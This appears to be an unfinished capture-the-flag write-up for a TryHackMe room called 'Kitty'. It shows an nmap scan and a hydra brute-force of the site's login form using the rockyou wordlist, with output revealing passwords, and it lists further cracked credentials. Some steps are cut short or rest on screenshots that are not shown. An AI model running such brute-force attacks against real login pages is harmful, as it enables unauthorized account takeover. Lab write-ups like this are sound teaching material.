# #1 introduction
<img width="647" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/0b9b87b9-98fb-4b13-ae10-fbfac330dd87">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx kitty.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- kitty.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)
index.php
register.php
welcome.php
logout.php
config.php


let's uses ffuf to fuzz for

<img width="1319" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/e0298a10-11c3-41ce-b90d-fc8d9f5607a9">



let's use hydra to try to bruteforce a HTTP account named kitty
```
┌──(parallels㉿kali)-[~]
└─$ hydra -I -l kitty -P /usr/share/wordlists/rockyou.txt kitty.thm http-post-form "/index.php:username=kitty&password=^PASS^:Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-12 13:39:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://kitty.thm:80/index.php:username=kitty&password=^PASS^:Invalid username
[STATUS] 2500.00 tries/min, 2500 tries in 00:01h, 14341899 to do in 95:37h, 16 active
[80][http-post-form] host: kitty.thm   login: kitty   password: sleepy
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-12 13:40:27
```

we found a password crystal associated to chris

<img width="644" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/de9244f8-92cf-47c7-8158-f2fab9f2bbff">

<img width="679" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/71f4fdbf-da07-404a-8334-fe9f3155c7af">

<img width="842" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/4ba1e35a-d462-4a8a-9055-5d083e028b46">

james:hackerrules!



